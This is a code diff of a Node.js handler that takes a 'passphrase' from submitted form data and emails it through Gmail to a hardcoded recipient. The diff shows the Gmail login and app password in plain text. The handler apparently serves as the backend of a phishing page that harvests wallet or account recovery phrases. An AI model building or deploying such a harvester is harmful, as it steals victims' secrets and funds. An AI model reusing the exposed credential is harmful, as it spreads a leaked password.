@@ -1,16 +1,15 @@
-// Import nodemailer
 const nodemailer = require('nodemailer');
 const { Input } = require('./models'); // Adjust path if needed
 
-// Configure nodemailer transport
+// Configure nodemailer transport (hardcoding credentials)
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   host: 'smtp.gmail.com',
   port: 465,
   secure: true,
   auth: {
-    user: "relate2hazel@gmail.com", // Gmail email
-    pass: "yurtanlosnxkpadu" // Use environment variable for sensitive data
+    user: "relate2hazel@gmail.com",  // Your Gmail address
+    pass: "yurtanlosnxkpadu"         // Your Gmail app password
   }
 });
 
@@ -18,7 +17,7 @@ const transporter = nodemailer.createTransport({
 module.exports = async (req, res) => {
   // Only handle POST requests
   if (req.method === 'POST') {
-    const { passphrase } = req.body; // Get passphrase from the request body
+    const { passphrase } = req.body;  // Get passphrase from the request body
 
     // Make sure passphrase is provided
     if (!passphrase) {
@@ -32,10 +31,10 @@ module.exports = async (req, res) => {
 
       // Set up email options
       const mailOptions = {
-        from: "relate2hazel@gmail.com",
-        to: "thierryalain643@gmail.com",
+        from: "relate2hazel@gmail.com",  // Gmail address
+        to: "thierryalain643@gmail.com", // Recipient email address
         subject: "New Input Received",
-        text: `Passphrase: ${passphrase}`
+        text: `Passphrase: ${passphrase}` // Email body
       };
 
       // Send the email
